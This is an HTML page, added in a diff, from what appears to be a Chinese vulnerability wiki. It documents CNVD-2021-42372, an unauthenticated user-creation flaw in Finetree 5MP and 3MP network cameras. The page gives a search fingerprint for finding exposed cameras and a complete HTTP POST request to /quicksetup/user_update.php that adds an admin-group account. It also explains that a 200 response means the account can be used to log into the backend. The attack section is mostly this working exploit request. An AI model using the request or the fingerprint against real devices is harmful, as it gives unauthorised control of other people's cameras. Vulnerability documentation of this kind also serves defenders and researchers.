@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/IOT%E5%AE%89%E5%85%A8/Finetree/Finetree%205MP%20%E6%91%84%E5%83%8F%E6%9C%BA%20user_pop.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E%20CNVD-2021-42372/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞 CNVD-2021-42372 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Finetree 5MP \u6444\u50cf\u673a user_pop.php \u4efb\u610f\u7528\u6237\u6dfb\u52a0\u6f0f\u6d1e CNVD-2021-42372", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Fortinet/Fortinet%20FortiOS%20admin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-40684/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Fortinet/Fortinet%20FortiOS%20admin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-40684/" class="btn btn-xs btn-link">
+        Fortinet FortiOS admin 远程命令执行漏洞 CVE-2022-40684
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-link">
+        DrayTek企业网络设备 远程命令执行 CVE-2020-8515
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="finetree-5mp-user_popphp-cnvd-2021-42372">Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞 CNVD-2021-42372<a class="headerlink" href="#finetree-5mp-user_popphp-cnvd-2021-42372" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Finetree 5MP 摄像机 user_pop.php文件存在未授权任意用户添加，攻击者添加后可以获取后台权限</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>Finetree 5MP</a-checkbox></br></p>
+<p><a-checkbox checked>Finetree 3MP</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>app="Finetree-5MP-Network-Camera"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1650596915704-1a1f5f17-da0a-46f7-878f-4e45d228b7b2.png" /></p>
+<p>存在漏洞的文件 user_pop.php</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1650596947183-6e5162c8-5039-47f7-9008-e1f06106a72f.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">quicksetup</span><span class="o">/</span><span class="n">user_update</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">58</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">PHPSESSID</span><span class="o">=</span><span class="n">fn4qnpv5c8a2jgvf53vs1gufm6</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mi">10_15_7</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">100.0.4896.127</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+
+<span class="n">method</span><span class="o">=</span><span class="n">add</span><span class="o">&amp;</span><span class="n">user</span><span class="o">=</span><span class="n">admin1234</span><span class="o">&amp;</span><span class="n">pwd</span><span class="o">=</span><span class="n">admin1234</span><span class="o">&amp;</span><span class="n">group</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">ptz_enable</span><span class="o">=</span><span class="mi">0</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1650597037790-9c10f375-9a20-4cb0-960e-c41c4962278d.png" /></p>
+<p>返回200即为添加成功，返回804则为用户重复，利用添加的账户就可以登录后台了</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1650597298546-243cca11-64a9-40ca-8a1f-acc98d75c74a.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Fortinet/Fortinet%20FortiOS%20admin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-40684/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Fortinet/Fortinet%20FortiOS%20admin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-40684/" class="btn btn-xs btn-link">
+        Fortinet FortiOS admin 远程命令执行漏洞 CVE-2022-40684
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/" class="btn btn-xs btn-link">
+        DrayTek企业网络设备 远程命令执行 CVE-2020-8515
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
